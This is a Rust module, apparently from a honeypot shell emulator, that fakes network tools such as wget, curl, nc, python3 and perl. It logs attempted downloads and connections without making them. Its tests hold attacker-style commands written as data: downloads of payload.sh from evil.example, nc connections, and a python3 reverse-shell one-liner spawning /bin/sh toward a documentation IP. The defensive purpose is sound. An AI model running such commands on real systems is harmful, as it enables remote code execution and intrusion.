use std::net::Ipv4Addr;

use crate::shell::{Capture, Shell};

mod interpreter;
mod ip;
mod nc;
mod ping;
mod sockets;
mod transfer;

pub use interpreter::{perl, python3};
pub use ip::ip;
pub use nc::nc;
pub use ping::ping;
pub use sockets::{netstat, ss};
pub use transfer::{curl, wget};

const STDOUT_DESTINATION: &str = "-";
const FNV1A_32_OFFSET_BASIS: u32 = 2166136261;
const FNV1A_32_PRIME: u32 = 16777619;

fn fake_resolve(host: &str) -> String {
    if host == "localhost" {
        return Ipv4Addr::LOCALHOST.to_string();
    }
    if let Ok(addr) = host.parse::<Ipv4Addr>() {
        return addr.to_string();
    }
    let h = host.bytes().fold(FNV1A_32_OFFSET_BASIS, |h, b| {
        (h ^ b as u32).wrapping_mul(FNV1A_32_PRIME)
    });

    let octet = |shift: u32| (h >> shift) % 254 + 1;
    format!(
        "{}.{}.{}.{}",
        13 + (h % 200),
        octet(8),
        octet(16),
        octet(24)
    )
}

fn capture_endpoint(shell: &mut Shell, tool: &str, url: String, dest: String) {
    shell.captures.push(Capture::Download {
        tool: tool.to_string(),
        url,
        dest,
    });
}

fn capture_connection(shell: &mut Shell, tool: &str, url: String) {
    capture_endpoint(shell, tool, url, STDOUT_DESTINATION.to_string());
}

#[cfg(test)]
mod tests {
    use crate::shell::{Capture, Screen, Shell};

    fn run(shell: &mut Shell, line: &str) -> String {
        shell.execute(line).text
    }

    #[test]
    fn wget_drops_file_and_records_capture() {
        let mut shell = Shell::new("root", "debian");
        let out = run(&mut shell, "wget http://evil.example/payload.sh");
        assert!(out.contains("200 OK"));
        assert!(out.contains("saved"));

        assert_eq!(shell.captures.len(), 1);
        match &shell.captures[0] {
            Capture::Download { tool, url, .. } => {
                assert_eq!(tool, "wget");
                assert_eq!(url, "http://evil.example/payload.sh");
            }
            other => panic!("expected a Download capture, got {other:?}"),
        }

        assert!(run(&mut shell, "ls").contains("payload.sh"));
    }

    #[test]
    fn curl_remote_name_saves_basename() {
        let mut shell = Shell::new("root", "debian");
        run(&mut shell, "curl -O http://evil.example/mal.bin");
        assert_eq!(shell.captures.len(), 1);
        assert!(run(&mut shell, "ls").contains("mal.bin"));
    }

    #[test]
    fn downloaded_file_matches_the_reported_size() {
        for (tool, cmd, name) in [
            ("wget", "wget http://evil.example/payload.sh", "payload.sh"),
            (
                "curl",
                "curl -O http://evil.example/payload.sh",
                "payload.sh",
            ),
        ] {
            let mut shell = Shell::new("root", "debian");
            let out = run(&mut shell, cmd);
            let reported = out
                .split_whitespace()
                .filter_map(|word| word.trim_matches(['[', ']', '/', '\'']).parse::<u64>().ok())
                .max()
                .unwrap_or_else(|| panic!("{tool} reported no size in:\n{out}"));

            let listed = run(&mut shell, &format!("wc -c {name}"));
            let on_disk: u64 = listed
                .split_whitespace()
                .next()
                .and_then(|n| n.parse().ok())
                .unwrap_or_else(|| panic!("{tool}: unexpected wc output {listed:?}"));

            assert_eq!(
                reported, on_disk,
                "{tool} reported {reported} bytes but wrote {on_disk}"
            );
            assert!(on_disk > 0, "{tool} left an empty placeholder");
        }
    }

    #[test]
    fn ping_bounded_with_count() {
        let mut shell = Shell::new("root", "debian");
        let out = run(&mut shell, "ping -c 3 8.8.8.8");
        assert!(out.contains("PING 8.8.8.8"));
        assert_eq!(out.matches("icmp_seq=").count(), 3);
        assert!(out.contains("3 packets transmitted, 3 received"));
    }

    #[test]
    fn netstat_ss_and_ip_render() {
        let mut shell = Shell::new("root", "debian");
        assert!(run(&mut shell, "netstat -tlnp").contains(":22"));
        assert!(run(&mut shell, "ss -tlnp").contains("sshd"));
        assert!(run(&mut shell, "ip addr").contains("eth0"));
        assert!(run(&mut shell, "ip route").contains("default via"));
    }
    #[test]
    fn nc_never_connects_but_records_the_endpoint() {
        let mut shell = Shell::new("root", "debian");
        let result = shell.execute("nc -v 198.51.100.9 4444");
        assert_eq!(result.status, 1);
        assert!(
            result.stderr.contains("failed: Connection refused"),
            "{}",
            result.stderr
        );

        assert!(shell.captures.iter().any(|c| matches!(
            c,
            Capture::Download { tool, url, .. }
                if tool == "nc" && url == "tcp://198.51.100.9:4444"
        )));
    }

    #[test]
    fn nc_listen_matches_what_debian_actually_does() {
        let mut shell = Shell::new("root", "debian");

        let result = shell.execute("nc -lvp 4444");
        assert_eq!(result.status, 1);
        assert!(result.stderr.contains("cannot use -p and -l"));
    }

    #[test]
    fn nc_listen_holds_the_screen_only_on_an_interactive_tty() {
        let mut shell = Shell::new("root", "debian");

        assert_eq!(run(&mut shell, "nc -l 4444"), "");
        assert!(
            matches!(shell.screen.take(), Some(Screen::Listen)),
            "nc -l should hold the screen on a terminal"
        );

        run(&mut shell, "nc -l 4444 | cat");
        assert!(shell.screen.is_none(), "a pipe should not hold the screen");
        run(&mut shell, "nc -l 4444 > /tmp/out");
        assert!(
            shell.screen.is_none(),
            "a redirect should not hold the screen"
        );
        shell.interactive = false;
        run(&mut shell, "nc -l 4444");
        assert!(shell.screen.is_none(), "exec should not hold the screen");
        shell.interactive = true;
    }

    #[test]
    fn python3_captures_a_reverse_shell_and_refuses_the_connection() {
        let mut shell = Shell::new("root", "debian");
        let payload = "python3 -c 'import socket,os,pty;s=socket.socket();\
                       s.connect((\"198.51.100.9\",9001));pty.spawn(\"/bin/sh\")'";
        let result = shell.execute(payload);
        assert_eq!(result.status, 1);
        assert!(
            result.stderr.contains("ConnectionRefusedError"),
            "{}",
            result.stderr
        );
        assert!(shell.captures.iter().any(|c| matches!(
            c,
            Capture::Download { tool, url, .. }
                if tool == "python3" && url == "tcp://198.51.100.9:9001"
        )));
    }

    #[test]
    fn python3_runs_nothing_and_says_so_consistently() {
        let mut shell = Shell::new("root", "debian");

        let quiet = shell.execute("python3 -c 'print(1+1)'");
        assert_eq!(quiet.status, 0);
        assert_eq!(quiet.stdout, "");

        let version = shell.execute("python3 --version");
        assert_eq!(version.stdout.trim(), "Python 3.11.2");
        assert!(shell.execute("dpkg -l").stdout.contains("3.11.2"));

        let missing = shell.execute("python3 /tmp/nope.py");
        assert_eq!(missing.status, 2);
        assert!(
            missing.stderr.contains("/tmp/nope.py': [Errno 2]"),
            "{}",
            missing.stderr
        );

        assert_eq!(shell.execute("python -c 'pass'").status, 127);
    }

    #[test]
    fn perl_reports_its_own_failures_not_pythons() {
        let mut shell = Shell::new("root", "debian");
        let result = shell.execute(
            "perl -e 'use Socket;connect(S,sockaddr_in(4444,inet_aton(\"203.0.113.5\")))'",
        );
        assert_eq!(result.status, 255);
        assert!(result.stderr.contains("Connection refused at -e line 1."));
        assert!(shell.captures.iter().any(|c| matches!(
            c,
            Capture::Download { tool, url, .. }
                if tool == "perl" && url == "tcp://203.0.113.5:4444"
        )));
        assert!(shell.execute("perl -v").stdout.contains("v5.36.0"));
    }
}
